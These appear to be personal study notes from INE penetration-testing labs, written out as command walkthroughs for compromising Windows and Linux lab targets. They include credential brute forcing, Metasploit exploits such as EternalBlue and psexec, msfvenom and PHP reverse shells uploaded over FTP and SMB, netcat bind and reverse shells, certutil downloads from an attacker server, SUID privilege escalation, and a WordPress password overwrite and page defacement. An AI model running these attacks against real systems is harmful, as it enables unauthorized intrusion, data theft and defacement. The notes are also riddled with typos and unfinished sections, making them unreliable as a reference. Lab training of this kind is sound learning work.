        #[21][ftp] host: demo.ine.local   login: administrator   password: vagrant
        
        ftp demo.ine.local 21
        #use the credentials Administrator/vagrant.
        #authentication successful
        #FTP directory, which in this case, appears to be the directory of the Microsoft IIS web server.
        
        **try this one::::**
        #Alternatively, we can also generate and upload a .asp reverse shell or web shell to the directory of the Microsoft IIS web server to gain remote access to the target system.
        
        ```
        
    - **Targeting OpenSSH**
        
        OpenSSH is a critical component in network security, offering encrypted communication sessions over a computer network using the SSH protocol.
        
        This lab is designed to demonstrate a range of techniques for exploiting a Windows system running OpenSSH, including identifying server vulnerabilities, utilizing brute force attacks to discover valid user credentials, and ultimately gaining remote access to the system.
        
        In this lab environment, you will be provided with GUI access to a Kali machine. The target machine will be accessible at **demo.ine.local**.
        
        **Objective:** To outline the various techniques that can be used to exploit a Windows system running OpenSSH.
        
        Tools: terminal, nmap, ssh , hydra
        
        ```bash
        nmap -sV -sC -p 22 demo.ine.local
        searchsploit OpenSSH 7.1
        hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt demo.ine.local ssh
        #actually i did not find this way 
        #actually work but it is time comsuming 
        ssh vagrant@demo.ine.local
        #uthenticating with vagrant/vagrant is successful 
        whoami
        ssh Administrator@demo.ine.local
        #authenticating with Administrator/vagrant is also successful.
        
        #I did with :
        use auxiliary/scanner/ssh/ssh_enumusers
        set RHOSTS demo.ine.local
        set USER_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt
        run
        #got username: vagrant
        
        use auxiliary/scanner/ssh/ssh_login
        set RHOSTS demo.ine.local
        set USERNAME admin
        set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
        run
        #pass:vagrant
        10.5.22.55:22 - Success: 'vagrant:vagrant' 'Microsoft Windows Server 2008 R2 Standard 6.1.7601 Service Pack 1 Build 7601'
        
        ```
        
    - **Targeting SMB**
        
        SMB (Server Message Block) is a network file-sharing protocol that allows applications on a computer to read and write to files and request services from server programs in a computer network.
        
        This lab focuses on exploiting SMB vulnerabilities on a Windows target, outlining methods to scan for weaknesses, perform brute force attacks to acquire credentials and utilize these credentials for deeper system access and control.
        
        In this lab environment, you will be provided with GUI access to a Kali machine. The target machine will be accessible at **demo.ine.local**.
        
        **Objective:** To outline the various techniques that can be used to exploit SMB on a Windows target.
        
        Tools: 
        
        - Terminal
        - Nmap
        - SMB
        - Hydra
        
        ```bash
        nmap -sV -sC -p 445 demo.ine.local
        #port 445 for smb
        hydra -l administrator -P /usr/share/wordlists/metasploit/unix_passwords.txt demo.ine.local smb
        #Administrator:vagrant smb brute-force attack
        hydra -l vagrant -P /usr/share/wordlists/metasploit/unix_passwords.txt demo.ine.local smb
        #**to identify legitimate passwords for both the Administrator and vagrant user accounts.**
        
        #Enumerating user accounts with enum4linux
        enum4linux -u vagrant -p vagrant -U demo.ine.local
        #able to identify other user accounts on the Windows target. This information is very useful as it can be used to fine-tune our brute force attacks by limiting the brute force to these usernames.
        
        #remotely authenticate with the target system via SMB to obtain remote access to the target system. This can be done through the use of the Python implementation of PsExec.
        #To begin with, you will need to copy the psexec.py script from the python3-impacket directory to your current working directory.
        
        cp /usr/share/doc/python3-impacket/examples/psexec.py /root/Desktop
        cd desktop
        chmod +x psexec.py
        python3 psexec.py Administrator@demo.ine.local
        #pass: vagrant user: Administrator
        
        #another way 
        #SMB authentication with PsExec
        msfconsole
        use exploit/windows/smb/psexec
        set RHOSTS demo.ine.local
        set SMBUser Administrator
        set SMBPass vagrant
        set payload windows/x64/meterpreter/reverse_tcp
        exploit
        #got meterpreter session
        
        ```
        
    - **Targeting MySQL Database Server**
        
        MySQL is a widely used open-source relational database management system that operates on a client-server model.
        
        This lab demonstrates techniques to exploit MySQL on a Windows target, focusing on identifying vulnerabilities, gaining unauthorized access, and manipulating database information to achieve administrative control.
        
        In this lab environment, you will be provided with GUI access to a Kali machine. The target machine will be accessible at **demo.ine.local**.
        
        **Objective:** To outline the various techniques that can be used to exploit SMB on a Windows target.
        
        **Tools: Terminal, Nmap, MySQL**
        
        ```bash
        nmap -sV -sC -p 3306 demo.ine.local
        #we will be targeting the MySQL port, as a result, we can limit our Nmap scan to port 3306.
        searchsploit MySQL 5.5
        
        #MySQL brute force
        
        msfconsole
        use auxiliary/scanner/mysql/mysql_login
        set RHOSTS demo.ine.local
        set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
        run 
        #brute force attack reveals that the MySQL password for the root user is NULL which means that we can log in to the MySQL database server with the root user account without providing a password!
        #root null pass
        
        mysql -u root -p -h demo.ine.local
        show databases;
        use wordpress;
        show tables;
        select * from wp_users;
        #From this point, we can copy the password hashes displayed in the user_pass column. Alternatively, we can also change the password for the admin user so that we can log in to the WordPress site being hosted on the WAMP server we identified in an earlier lab.
        
        #From this point, we can copy the password hashes displayed in the user_pass column. Alternatively, we can also change the password for the admin user so that we can log in to the WordPress site being hosted on the WAMP server we identified in an earlier lab.
        UPDATE wp_users SET user_pass = MD5('password123') WHERE user_login = 'admin';
        http://demo.ine.local:8585/wordpress/wp-admin
         #admin and the password password123 
        #We have been able to successfully gain access to the MySQL database server and modify the WordPress admin user account password consequently gaining administrative control over the WordPress site.
        
        ```
        
        In this lab, we explored the process of performing a brute force attack on the MySQL database server, authenticating to the MySQL database server remotely and modifying the WordPress admin user account password to obtain administrative control over the WordPress site.
        
    - **CTF 2**
        
        This lab focuses on exploiting a Windows target machine. By identifying services, analyzing misconfigurations, and leveraging discovered credentials, you'll uncover and capture the flags. Tasks involve exploiting SMB misconfigurations, utilizing NTLM hashes, and gaining access to the system.
        
        Skill Check Labs are interactive, hands-on exercises designed to validate the knowledge and skills you’ve gained in this course through real-world scenarios. Each lab presents practical tasks that require you to apply what you’ve learned. Unlike other INE labs, solutions are not provided, challenging you to demonstrate your understanding and problem-solving abilities. Your performance is graded, allowing you to track progress and measure skill growth over time.
        
        A target machine is accessible at **target.ine.local**. Identify the services and capure the flags.
        
        - **Flag 1:** Looks like smb user **tom** has not changed his password from a very long time.
        - **Flag 2:** Using the NTLM hash list discovered in the previous challenge, can you compromise the smb user **nancy**?
        - **Flag 3:** I wonder what the hint found in the previous challenge be useful for!
        - **Flag 4:** Can you compromise the target machine and retrieve the **C://flag4.txt** file?
        
        The following wordlist will be useful:
        
        - /usr/share/wordlists/metasploit/unix_passwords.txt
        
        **Tools: msf, nmap, smbmap, firefox**
        
        ```bash
        **//Flag1**
        
        namp -sC -sV target.ine.local
        #SMB service is running on port 445, and as the question suggests, user Tom has a weak password. Let’s attempt to brute-force the password using CrackMapExec.
        #Hydra, CrackMapExec, or a Metasploit module for brute-forcing, but in this case, we’ll use CrackMapExec.
        
        crackmapexec smb target.ine.local -u tom -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
        #got credentials: password: felipe.
        
        smbmap -H target.ine.local -u tom -p felipe
        #there are only three shares with read-only access
        smbclient //target.ine.local/HRDocuments -U tom
        pass: felipe
        smb> ls
        smb: mget flag1.txt
        smb:>leaked-hashes.txt
        
        #new linux command 
        ls cat flag1.txt
        
        **//Flag2**
        
        msfconsole
        use auxiliary/scanner/smb/smb_login
        set rhosts target.ine.local
        set PASS_FILE lekaded-hashes.txt
        set SMBUser nancy
        set CreateSession ture
        run
        #got sessions
        sessions 1
        smb:>shares
        smb>shares -i ITResources
        smb>download flag2.txt
        smb>download hint.txt
        
        cat flag2.txt
        cat hint.txt          //david:omnitrix_9901
        
        //Flag3
        
        ftp target.ine.local
        user:david pass: omnitrix_9901
        ftp>dir
        ftp> get flag3.txt
        cat flag3.txt
        
        //Flag4
        
        #we see port 80 is open we have ftp access
        #Enumeration shows that FTP is linked to this port, meaning any files uploaded will be reflected on the website. Since the server is running IIS, we can upload an ASPX shell
        
        msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.44.2 LPORT=1234 -f aspx > shell.aspx
        #USE IP address for lhost
        ls
        
        ftp>put shell.aspx
        
        use exploit/multi/handler
        set PAYLOAD windows/x64/meterpreter/reverse_tcp
        set LHOST 10.10.44.2
        set LPORT 1234
        run
        
        #got meterpreter session
        meterpreter>cat C://flag4.txt
        
        ```
        
    
    - **Port Scanning and Enumeration- Linux**
        
        Port scanning and enumeration are fundamental techniques that help identify open ports, services running on those ports, and potential vulnerabilities on target systems.
        
        This lab guides you on how to perform port scanning and enumeration on a Linux target.
        
        In this lab environment, you will be provided with GUI access to a Kali machine. The target machine will be accessible at **demo.ine.local**.
        
        **Objective:** Identify open ports on the target system and identify any potentially interesting services that can be exploited to gain access to the system.
        
        Tools: nmap, netcat , firefox
        
        ```bash
        
        nmap -sV -p1-10000 10.0.20.13  
        nc -nv 10.0.20.13 512
        #open
        nc -nv 10.0.20.13 1524
        #open
        #Why did we receive a shell? We received a shell because the port was running a bind shell.
        
        http://demo.ine.local:80
        #got metasploitable2
        
        ```
        
    - **Targeting vsFTPd**
        
        FTP (File Transfer Protocol) is a standard network protocol used to transfer files between a client and server on a computer network.
        
        This lab demonstrates the process of identifying and exploiting vulnerabilities in an FTP server on a Linux target, including techniques like anonymous login checks, searching for relevant exploits, and performing brute-force attacks to gain unauthorized access.
        
        In this lab environment, you will be provided with GUI access to a Kali machine. The target machine will be accessible at **demo.ine.local**.
        
        **Objective:** To outline the various techniques that can be used to exploit an FTP server running on a Linux target.
        
        Tools:
        
        - Terminal
        - Nmap
        - FTP
        - msfconsole
        - Hydra
        
        ```bash
        
        nmap -sV -sC -p 21 demo.ine.local
        #we will be targeting the FTP port, as a result, we can limit our Nmap scan to port 21.
        # vsftpd 2.3.4 is the exact version of FTP running on port 21 in addition to telling us that anonymous logons are enabled on the FTP server.
        
        ftp demo.ine.local 21
        #user:pass anonymous:anonymous
        #FTP directory is empty and we do not have the permissions required to navigate to other directories within the Linux target's filesystem.
        searchsploit vsftpd
        # Metasploit exploit module that affects vsftpd 2.3.4.
        
        msfconsole
        use exploit/unix/ftp/vsftpd_234_backdoor
        set RHOSTS demo.ine.local
        run
        #result, we are not able to gain access to the target system.
        #In this case, it looks like the vulnerability has been patched on the system therefore rendering this exploit ineffective. We will have to find another way in.
        
        hydra -L /usr/share/metasploit-framework/data/wordlists/unix_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt demo.ine.local ftp
        #ftp brute force
        ftp demo.ine.local 21
        # identify a user account called **service** with the password service.
        #service:service
        pwd
        ls -la
        cd /home/service
        pwd          # Print working directory
        ls           # List files
        cd <dir>     # Change directory
        get <file>   # Download file
        put <file>   # Upload file
        binary       # Set binary transfer mode
        ascii        # Set ASCII transfer mode
        ftp> get config.txt
        ftp> get backup.tar
        
        #try another
        An attacker could potentially use this access to upload a reverse shell payload to gain access to the target system.
        ```
        
    - **Targeting PHP**
        
        PHP is a widely-used server-side scripting language for web development. Its popularity and extensive use in web applications make it a common target for penetration testers. This lab covers the process of exploiting a vulnerable version of PHP running on Apache on a Linux target.
        
        In this lab environment, you will be provided with GUI access to a Kali machine. The target machine running a vulnerable version of PHP will be accessible at **demo.ine.local**.
        
        **Objective:** Exploit the vulnerable PHP running on the target web server and gain a meterpreter session.
        
        Tools: nmap, msf, firefox
        
        ```bash
        nmap -sV -sC -p 80 demo.ine.local
        #Apache 2.2.8 is running on port 80.
        
        http://demo.ine.local/phpinfo
        # phpinfo.php file reveals that PHP 5.2.4 is running on the web server.
        searchsploit php cgi
        #msf exploit
        
        msfconsole
        use exploit/multi/http/php_cgi_arg_injection
        set RHOSTS demo.ine.local
        run 
        #got meterpreter session
        getuid
        sysinfo
        
        ```
        
    - **Targeting SAMBA**
        
        Samba is an open-source software suite that provides seamless file and print services to SMB/CIFS clients. It allows for interoperability between Unix/Linux and Windows systems, enabling Unix/Linux systems to share files and printers with Windows clients and vice versa. This lab covers the process of exploiting a vulnerable version of SAMBA running on a Linux target.
        
        In this lab environment, you will be provided with GUI access to a Kali machine. The target machine running a vulnerable version of Samba will be accessible at **demo.ine.local**.
        
        **Objective:** Exploit the vulnerable Samba service and gain a shell.
        
        Toosl: nmap, msf
        
        ```bash
        nmap -sV -p 445 demo.ine.local
        #Samba smbd is running on port 445.
        nmap -sV -sC -O demo.ine.local
        #Samba 3.0.20-Debian
        or
        msfconsole
        use auxiliary/scanner/smb/smb_version
        set RHOSTS demo.ine.local
        run
        # samba 3.0.20-dabian
        
        searchsploit samba 3.0.20
        
        use exploit/multi/samba/usermap_script
        set RHOSTS demo.ine.local
        exploit
        
        #the exploit module runs successfully and provides us with a command shell.
        whoami
        root
        pwd
        ```
        
    - **CTF 3**
        
        This lab focuses on identifying and exploiting vulnerabilities across two target machines. By uncovering weaknesses in services and configurations, you’ll retrieve flags from various locations. Tasks include exploiting vulnerable services, interacting with local network services, leveraging misconfigurations, and performing privilege escalation to access restricted directories.
        
        Skill Check Labs are interactive, hands-on exercises designed to validate the knowledge and skills you’ve gained in this course through real-world scenarios. Each lab presents practical tasks that require you to apply what you’ve learned. Unlike other INE labs, solutions are not provided, challenging you to demonstrate your understanding and problem-solving abilities. Your performance is graded, allowing you to track progress and measure skill growth over time.
        
        Two machines are accessible at **target1.ine.local** and **target2.ine.local**. Enumerate the targets, identify and exploit the misconfigurations or vulnerabilities to capture the flags. The flag is in an md5 hash format.
        
        - **Flag 1:** A vulnerable service maybe running on **target1.ine.local**. If exploitable, retrieve the flag from the root directory.
        - **Flag 2:** Further, a quick interaction with a local network service on **target1.ine.local** may reveal this flag. Use the hint given in the previous flag.
        - **Flag 3:** A misconfigured service running on **target2.ine.local** may help you gain access to the machine. Can you retrieve the flag from the root directory?
        - **Flag 4:** Can you escalate to root on **target2.ine.local** and read the flag from the restricted /root directory?
        
        **Tools: msf, nmap, python3, netcat, smbmap, smbclient, netstat**
        
        ```bash
        **//Flag1**
        nmap -sC -sV target1.ine.local
        #port 21 FTP service, which is running version 1.3.5.
        searchsploit ProFTPD 1.3.5
        #identified this service as vulnerable, and an exploit is available in the Metasploit module which is unix/ftp/proftpd_modcopy_exec
        
        msfconsole
        search proftpd 1.3.5
        use exploit/unix/ftp/proftpd_modcopy_exec
        set lhost 192.2.205.2
        set rhosts target1.ine.local
        set SITEPATH /var/www/html
        run
        #got the sessions an upgrade meterpreter session
        sessions
        sessions -u 1
        #got meterpreter2
        sessions -i 2
        meterpreter>cat /flag1.txt
        
        **//Flag2**
        
        #need to enumerate local services on the target
        meterpreter>netstat -tuln 127.0.0.1
        
        shell
        /bin/bash -i
        $netstat -tuln 127.0.0.1:8888
        $passpharse: letmein         //from flag1 attach info
        
        #got the flag
        
        **//Flag3**
        
        nmap -sC -sV target2.ine.local
        #HTTP and SMB services are running
        enum4linux -a target2.ine.local
        #there is one share with mapping and listing enabled
        
        smbclient //target2.ine.local/site-uploads
        #enter a blank password when prompted.
        smb>
        #we have access to site-uploads
        #meaning anything we upload here reflects on the website, let's upload our malicious file to the SMB server by copying the PHP shell with the command
        
        #another command window
        cp /usr/share/webshells/php/**php-reverse-shell.php .**
        nano php-reverse-shell.php 
        #edit ip to eth1 and port 1234
        cat php-reverse-shell.php
        
        smb>put **php-reverse-shell.php** 
        
        #another window
        nc -nvlp 1234 
        
        #open the http link got the nc shell
        http://target2.ine.local/site-uploads/php-reverse-shell.php
        
        nc shell>> cat /flag3.txt
        
        **//Flag4**
        
        cat /etc/shells
        #checking available shells on system
        cat /etc/shells | while read shell; do ls -l $shell 2>/dev/null; done
        #to check permission each shell
        #we can use any shell with the permission lrwxrwxrwx for escalation
        
        #to check for executables with the SetUID bit set that can run with root privileges
        find / -perm -4000 2>/dev/null
        #-perm -4000: Looks for files with the SetUID permission bit set
        
        #By combining the find command with an executable like /bin/shor /bin/rbash, we can spawn a new shell with root privileges
        find / -exec /bin/rbash -p \; -quit
        whoami
        root
        cat /root/flag4.txt
        
        ```
        
    
    Searching for exploits ::
    
    Exploitdb, searchsploit, google hacking database, CVE
    
    - **Banner Grabbing**
        - `nmap -sV --script=banner 192.167.72.3`
        - `nc 192.167.72.3 22`
        - banner grabbing
            
            ```bash
            ifconfig
            //eth1 next ip is target ip
            nmap -sV -O ip
            //ssh version: openssh 
            ls -al /usr/share/nmap/scripts/  |grep banner
            namp -sV --script=banner ip
            whatis nc
            man nc
            nc target_ip 22         //22 is a port
            searchsploit openssh 7.2
            ssh root@ip
            //print welcome banner
            terminate
            ```
            
        - Vulnerability Scanning with Nmap scripts
            
            ```bash
            ifconfig
            nmap -sV -O target_ip
            ls -al /usr/share/nmap/scripts/  | grep banner
            namp -sV -p 80 --script=http-enum ip
            nano /usr/share/nmap/scripts/htp-enum.nse
            
            //how to utilize 
            
            ls -al /usr/share/nmap/scripts/  | grep vuln
            ls -al /usr/share/nmap/scripts/  | grep shellshock
            
            nmap -sV -p 80 --script=http-shellshock.nse ip
            //vulnerable very vital command
            nmap -sV -p 80 --script=http-shellshock --script-args "http-shellshock.uri=/gettime.cgi" ip
            
            ls -al /usr/share/nmap/scripts/  | grep ftp
            ```
            
        - Vulnerability scanning with Metasploit
            
            ```bash
            ifconfig
            sudo nmap -sS -sV target_ip
            searchsploit EternalBlue
            searchsploit ms17-010
             msfconsole
             search eternalblue
             use auxiliary/scanner/smb/smb_ms17_010
             show options
             set RHOSTS ip
             run
             
             use exploit/windows/smb/ms17_010_eternalblue
             set RHOSTS ip
             show options
             exploit
             
             meterpreter>sysinfo
             getuid
             
            ```
            
        
    - **Exploit**
        - Searching For Publicly available exploits
            
            ```bash
            //search in google
            **exploit-db**
            //search rapid7
            //google dork
            openssh 7.2 site:exploit-db.com      or github.com   or rapid7
            
            /in google packet storm
            packet storm
            
            ```
            
        - Searching for exploits with SearchSploit
            
            ```bash
            
            **important for windows blackbox
            
            sudo apt-get update && sudo apt-get install exploitdb -y
            
            ls -al  /usr/share/exploitdb
            
            ls -al /usr/share/exploitdb/exploit/windows/remote
            searchsploit
            searchsploit -u              //update this
            exit
            searchsploit vsftpd
            seachsploit vsftpd 2.3.4
            pwd
            searchsploit -m 49757
            ls -la
            
            vim 49757.py
            :wq
            
            searchsploit -c Openssh
            //case sensitive
            searchsploit -c openssh
            //not get much info
            seachsploit -t vsftpd
            searchsploit -t Buffer Overflow
            searchsploit --help
            searchsploit -e "Windows XP"
            seachsploit -e "Windows XP" | grep -e "Microsoft"
            searchsploit -e "OpenSSH"
            searchspoit
            searchsploit remote windows smb
            seachsploit remote windows buffer
            seachsoploit remote linux ssh OpenSSH
            searchspoit remote webapps wordpress
            searchspoit remote webapps drupal
            searchsploit remote windows smb -w | grep -e "EternalBlue"
            //open link 
            sudo cp /usr/share/exploitdb/exploits/windows/remote/42031.py
            ls
            //copy the file 
            ```
            
        
        - Fixing Exploits
            
            ```bash
            ///some problme in note taking
            ????given target ip
            
            nmap -sV ip
            //httpfileserver rejeto
            searchsploit HTTP File Server 2.3
            cd Desktop
            searchsploit -m 39161
            vim 39...py
            exit
            python 39161.py ip 80
            ifconfig
            //change in vim ip and port
            cd Desktop
            cp /usr/shar/appl..
            
            //command1
            python 39161.py ip 80
            
            //command2 
            python -m SimpleHTTPServer 80
            
            //command3 
            nc -nvlp 1234
            
            ```
            
        - Cross Compiling Exploits
            
            ```bash
            
            sudo pat-get install mingw-w64
            sudo apt-get install gcc
            pwd
            //exploit db  go  there 
            searchsploit VideoLAN VLC SMB
            seachsploit -m 9303
            ls
            vim 9303.c
            i686-w64-mingw32-gcc 9303.c -o exploit -lws2_32
            ls -al
            
            //for successfuuly compile
            searchsploit Dirty Cow
            searchsploit -m 40839
            gcc -pthread 40839.c -o exploit -lcrypt
            ls -al
            
            ```
            
        
    - **Shells**
        - Netcat Fundamentals
            
            tcp/ip swiss army knife;   client and server mode
            
            ```bash
            
            //given target_ip
            //windows 2012 server
            #
            nc --help
            man nc
            //command 1
            nc -nv target_ip 80
            nc -nvlp target_ip 80
            nc -nvu ip 139     /u for udp port
            ls -al /usr/share/windows-binaries/
            cd /usr..binaries
            python -m SimpleHTTPServer 80
            
            //windows system
            cmd
            //administrator
            cd Desktop
            certutil -urlcache -f http://10.10.3.3/nc.exe nc.exe
            nc.exe -h
            nc.exe -nv ip 1234
            //kali
            nc -nvlp 1234
            hello
            //windows
            ...write text in linux and found in windows
            
            //nc with listener
            //kali
            nc -nvlup 1234
            //windows
            //windows Desktop
            nc.exe -nvu ip 1234
            ....can send any message and found both linux and windows
            
            //kali
            vim test.txt
            hello  this is the main terp
            //windows desktop
            nc.exe -nvlp 1234 > text.txt
            
            //kali
            nc -nv ip 1234 < 1234.txt
            
            ```
            
        - Bind shells
            
            ```bash
            //why revere shell over bind shell?
            //given target ip eternal blue
            //kali
            cd /usr/share/windows-binaries
            ls -al
            python -m SimpleHTTPServer 80
            
            //another ifconfg eth1 search in website and downloads
            //windows
            cmd administrator
            cd Downloads
            dir
            nc.exe -nvlp 1234 -e cmd.exe
            
            //kali
            nc -nv ip 1234
            whoami
            dir
            exit
            
            //windows attacker
            
            //kali
            nc -nvlp 1234 -c /bin/bash
            //windows
            nc.exe -nv ip 1234
            ls
            /bin/bash -i
            id
            
            ```
            
        - Reverse Shells
            
            ```bash
            //reverse shell better over bind shell ... not block firewall
            
            //attacker kali     //target windows
            //kali
            ifconfig eht1
            nc -nvlp 1234
            
            //windows desktop
            nc.exe -nv ip 1234 cmd.exe
            //in kali get reverse shell
            whoami
            
            //kali
            nc -nvlp 1234
            nc -nv ip -e /bin/bash
            
            //windows
            
            ```
            
        - Reverse Shell Cheatsheet
            
            ```bash
            //github
            swisskeyrpo/PayloadsAllTheThings
            Reverse Shell Cheat Sheet
            //**Reverse Shell Generator**     search in google
            url: [**https://www.revshells.com/**](https://www.revshells.com/)
            
            ```
            
    - **Frameworks**
        - The Metasploit Framework MSF
            
            ```bash
            dsfdsfsdafsd
            ```
            
        - PowerShell Empire
            
            ```bash
            //install
            sudo apt-get update && suod apt-get install powershell-empire starkiller -y
            sudo powershell-empire server
            server>              //server here
            
            //open new tab 
            sudo powershell-empire server
            empire>listeners
            agents
            
            //open **starkiller** in kali
            
            ```
            
    
    - Windows Exploitation
        - windows **BlackBox** penetration test
            
            ```bash
            
            windows server 2008
            ..
            1.identify servies running on the target
            2. identify vulnerablilityes within the services
            3. exploit these vulnerabilities to obtain an initial foothold
            ```
            
        - Port Scanning and Enumeration Windows
            
            ```bash
            **//not provide ip**
            
            //kali
            **cat /etc/host**
            output: 10.10.16.2       demo.ine.local
            //copy ip
            cd Desktop
            mkdir win2k8
            ping 10.10.16.2
            nmap -sV ip
            nmap -T4 -PA -sC -sV -p 1-10000 ip -oX nmap_10X
            
            //another command windows kali
            nc -nv 10.0.22.85 21
            
            //browser http://10.0.22.85:8585   //check diff port
            
            service postgresql start && msfconsole
            db_status
            workspace -a Win2k8
            setg RHOST 10.2.29.246
            setg RHOSTS 10.2.29.246
            db_import /root/Desktop/Win2k8/nmap_10k`
            hosts
            services
            use auxiliary/scanner/smb/smb_version
            run
            hosts
            workspace
            hosts
            services
            
            nmap -T4 -PA -sC -sV -p 1-10000 ip -oX nmap_10X
            nmap -sU -sV ip      //udp scanning
            
            ```
            
        
        1. **IIS FTP (targeting microsoft)**
        - `nmap -sV -sC -p21,80 10.2.29.246`
        
        - ls -al  /usr/share/nmap/scripts/ | grep ftp
        - nmap -sV -p 21 —script=ftp-anon ip
        - `ftp 10.2.29.246 21`- anonymous login failed
        - `hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt 10.2.29.246 ftp`
        - `hydra -l vagrant -P /usr/share/wordlists/metasploit/unix_users.txt 10.2.29.246 ftp -I`
        - Now login using valid user cred
        - `ftp 10.2.29.246` Use administartor:vagrant
        - ftp>ls
        - exit
        - Create one .asp and upload to ftp
        - `msfvenom -p windows/shell/reverse_tcp LHOST=10.10.24.4 LPORT=1234 -f asp > shell.aspx`
        - `ftp 10.2.29.246` Use vagrant:vagrant
        - ftp>ls
        - `put shell.aspx`
        - get index.html
        
        //open new tab kali
        
        **cd Desktop/win2k8**
        
        **ls**
        
        **vim index.html**
        
        **//edit vim file like deface page ; <h1> Website Hacked !!!</h1>**
        
        **:wq**
        
        **//go again ftp**
        
        **ftp>put index.html**
        
        **ftp>ls**
        
        - Go to msfconsole session
        - `use multi/handler
        set payload windows/shell/reverse_tcp
        set LHOST 10.10.24.4
        set LPORT 1234`
        - Open the browser and navigate to 10.2.29.246/shell.aspx
        - got reverse shell
        
        1. **OpenSSH**
        - `nmap -sV -sC -p 22 10.2.16.83`
        - searchsploit OpenSSH 7.1
        - `hydra -l vagrant -P /usr/share/wordlists/metasploit/unix_users.txt 10.2.16.83 ssh`
        - `hydra -l administrator /usr/share/wordlists/metasploit/unix_users.txt 10.2.16.83 ssh`
        - `ssh [vagrant@10.2.16.83](mailto:vagrant@10.2.16.83)` use vagrant:vagrant
        - ls -al
        - whoami
        - exit
        - `msfconsole`
        - `use auxiliary/scanner/ssh/ssh_login
        setg RHOST 10.2.16.83
        setg RHOSTS 10.2.16.83
        set USERNAME vagrant
        set PASSWORD vagrant
        run
        session -u 1`
        - Got meterpreter sessions
        - `ssh [vagrant@10.2.16.83](mailto:vagrant@10.2.16.83)` use vagrant:vagrant
        - bash
        - `net localgroup administrators`
        - whami /priv
        
        1. **SMB (targeting)**
        - `nmap -sV -sC -p 445 10.2.26.45`   //default smb port 445
        - `hydra -l administrator -P /usr/share/wordlists/metasploit/unix_passwords.txt 10.2.26.45 smb`
        - `hydra -l **vagrant** -P /usr/share/wordlists/metasploit/unix_passwords.txt 10.2.26.45 smb`
        - `smbclient -L 10.2.26.45 -U vagrant`
        - `smbmap -u **vagrant** -p **vagrant** -H 10.2.26.45`
        - `enum4linux -u vagrant -p vagrant -U 10.2.26.45`
        
        again after msf
        
        - `locate [psexec.py](http://psexec.py/)
        cp /usr/share/doc/python3-impacket/examples/psexec.py .
        chmod +x [psexec.py](http://psexec.py/)`
        - `python3 [psexec.py](http://psexec.py/) [Administrator@10.2.26.45](mailto:Administrator@10.2.26.45)`
        - whomai
        
        - `msfconsole`
        - search smb_enumusers
        - use auxiliary/scanner/smb_enumusers
        - show options
        - `set RHOSTS 10.2.26.45
        set SMBUser Administrator
        set SMBPass vagrant`
        - run
        `use exploit/windows/smb/psexec
        set RHOSTS 10.2.26.45
        set SMBUser Administrator
        set SMBPass vagrant
        set payload windows/x64/meterpreter/reverse_tcp`
        exploit
        - meterpreter> get /priv
        - `use exploit/windows/smb/ms17_010_eternalblue
        options
        set RHOSTS 10.2.26.45
        exploit`
        - meterpreter>sysinfo
        - getuid
        
        1. **MYSQL**
        - `nmap -sV -sC -p 3306,8585 10.2.26.45`
        - searchsploit MySQL 5.5
        - `use auxiliary/scanner/mysql/mysql_login
        set RHOSTS 10.2.26.45
        set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
        run`
        - //kali
        - `mysql -u root -p -h 10.2.26.45  //root password is empty`
        - mySQL>
        - `show databases;
        use wordpress;
        show tables;
        select * from wp_users;`
        - `UPDATE wp_users SET user_pass = MD5('password123') WHERE user_login = 'admin'; - change password`
        - msf:
        - `exploit eternalblue`
        - `use exploit/windows/smb/ms17_010_eternalblue
        set RHOSTS 10.2.26.45
        run`
        - meterpreter>
        - `sysinfo`
        - `cd /
        cd wamp
        dir
        cd www\\wordpress
        cat wp-config.php`
        - cd ..
        - cd ..
        - cd alias\\
        - download phpmyadmin.conf
        - //go in the MySQL shell and exit and vim phpmyadmin.config and edit and allow for all and :wq  and then go meterpreter
        - upload phpmyadmin.conf       //check in the browser
        - net stop wamapache
        - net start wampapache
        
        //changing ,utilizing , updating the wordpress site
        
        - see mysql cred in this file
    - **Linux Exploitation**
        - Port Scanning and Enumeration
            
            ```bash
            
            cat /etc/hosts          //checking target ip
            
            nmap -sV -p 1-10000 10.2.20.205 -oN nmap_10k.txt
            nc -nv 10.2.20.205 1524    //check diff port:provides a direct shell
            cat /etc/*release
            cd /home
            ls
            
            - Access the web server [http://10.2.20.205](http://10.2.20.205/)
            
            ```
            
        
        **vsFTPd**
        
        for ftp port 21 scan with nmap
        
        - `nmap -sV -sC -p 21 10.2.20.205`
        - `ftp 10.2.20.205 21`- name: anonymous  and pass: enter
        - ftp>ls
        - pwd
        - exit
        
        searchsploit vftpd
        
        searchsploit -m 49757.py
        
        vim 49757.py
        
        chmod +x  49757.py
        
        python3 [49757.py](http://49757.py) ip
        
        //connection refused
        
        msf:
        
        use exploit/unix/ftp/vsftpd_23_backdoor
        
        exploit      //failed  cz pashed or autoblocked
        
        nmap -sV -p 25 ip
        
        - `use auxiliary/scanner/smtp/smtp_enum
        setg RHOSTS 10.2.20.205
        set UNIXONLY true
        run`         got the diff users like : service
        - `hydra -l service -P /usr/share/metasploit-framework/data/wordlists/unix_users.txt 10.2.20.205 ftp` got cred service: service
        - `ftp 10.2.20.205 21`   use service: service
        - ftp>pwd
        - cd /
        - ls
        
        exit
        
        - Upload a **`PHP`** reverse shell via FTP to the `/dav` directory and launch it with the browser
        - `ls -al /usr/share/webshells/php/
        cp /usr/share/webshells/php/php-reverse-shell.php .
        mv php-reverse-shell.php shell.php
        vim shell.php`    //change the ip and port :1234
        - `nc -nvlp 1234`
        - Login with FTP again and upload the shell.php
        - `cd /
        cd /var/www/
        put shell.php`
        - Open the browser and refresh [http://10.2.20.205/dav/](http://10.2.20.205/dav/)
        - run shell.php
        - /bin/bash -i
        - ls
        - cd /root
        - Got reverse shell in netcat listener
        
        **PHP**
        
        - nmap -sV -sC -p 80 ip           //metasploitable 2
        
        goto browser:
        
        - [http://10.2.20.205/phpinfo.php](http://10.2.20.205/phpinfo.php)
        - seachsploit php cgi
        - 
        - Exploit using this `exploit/multi/http/php_cgi_arg_injection`
        
        **SAMBA**
        
